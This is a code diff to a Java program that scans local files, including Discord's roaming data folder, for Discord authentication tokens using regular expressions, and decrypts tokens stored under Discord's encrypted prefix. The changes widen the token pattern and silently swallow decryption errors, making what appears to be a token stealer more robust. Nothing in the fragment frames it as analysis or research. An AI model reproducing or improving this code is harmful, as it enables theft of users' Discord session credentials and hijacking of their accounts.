@@ -52,7 +52,7 @@ public class Main {
                                 try (BufferedReader br = new BufferedReader(new FileReader(file.toFile()))) {
                                     String line;
                                     while ((line = br.readLine()) != null) {
-                                        parseToken(line, "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{38}");
+                                        parseToken(line, "[\\w-]{26}\\.[\\w-]{6}\\.[\\w-]{38}");
                                         if (fpath.contains("roaming") && fpath.contains("discord")) {
                                             parseToken(line, "dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$][^\\\"]*");
                                         }
@@ -70,7 +70,10 @@ public class Main {
         while (m.find()) {
             String token = m.group();
             if (m.group().startsWith("dQw4w9WgXcQ")) {
-                token = Helper.getChecker().decryptToken(m.group());
+                try {
+                    token = Helper.getChecker().decryptToken(m.group());
+                   } catch (Exception e) {
+                }
             }
             if (!tokens.contains(token)) {
                 Long.parseLong(new String(Base64.getDecoder().decode(token.split("\\.")[0]), StandardCharsets.UTF_8));
